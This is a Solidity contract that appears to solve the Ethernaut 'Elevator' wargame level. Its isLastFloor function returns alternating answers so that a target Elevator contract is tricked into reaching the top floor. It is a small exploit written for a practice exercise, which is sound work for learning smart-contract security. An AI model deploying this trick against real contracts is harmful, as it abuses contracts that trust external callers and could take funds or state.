// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BuildingSolver {

    bool lasfloor;

    constructor(){ lasfloor = true; }

    function isLastFloor(uint) external returns (bool){
        lasfloor = !lasfloor;
        return lasfloor;
    }

    function pwn(IElevator elevator, uint floor) public {
        elevator.goTo(floor);
    }
}

interface IElevator {
    function goTo(uint _floor) external;
}